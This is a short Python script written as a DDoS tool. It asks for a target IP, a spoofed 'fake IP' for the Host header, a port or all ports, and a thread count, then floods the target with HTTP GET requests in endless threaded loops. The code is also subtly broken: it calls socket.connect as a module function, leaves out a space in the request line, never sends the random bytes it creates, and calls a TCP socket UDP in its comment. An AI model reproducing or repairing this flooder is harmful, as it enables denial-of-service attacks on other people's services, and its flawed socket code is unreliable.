import os
import random
import socket
import threading

ip=input("Enter the IP: ")
fake_ip= input("Enter your fake IP: ")
port=int(input("Enter the desired port for all ports or press -1 for all ports: "))
threads=int(input("Enter the number of threads: "))

#socket connection provides two nodes, one to listen on and the other to connect.AF_INET indicates ipv4 while SOCK_DGRAM indicates UDP connection.
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

bytes=random._urandom(9990)

def ddos(ip, port, thread):
    c=0
    while True:
        if port==int(-1):
            total= int(65534)
            for p in range(1,total):
                s=socket.connect(ip,p)
                s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,p))
                s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,p))
                s.close()
                c=c+1
                print(f"Sent {c} packets to {ip} via thread {thread}")
        else:    
            s=socket.connect(ip,port)
            s.sendto(("GET /"+ ip+ "HTTP/1.1\r\n").encode('ascii'), (ip,port))
            s.sendto(("Host: "+ fake_ip+ "\r\n\r\n").encode('ascii'), (ip,port))
            s.close()
            c=c+1
            print(f"Sent {c} packets to {ip} via thread {thread}")

for thread in range(threads):
    threading.Thread(target=ddos, args=(ip,port,thread)).start()
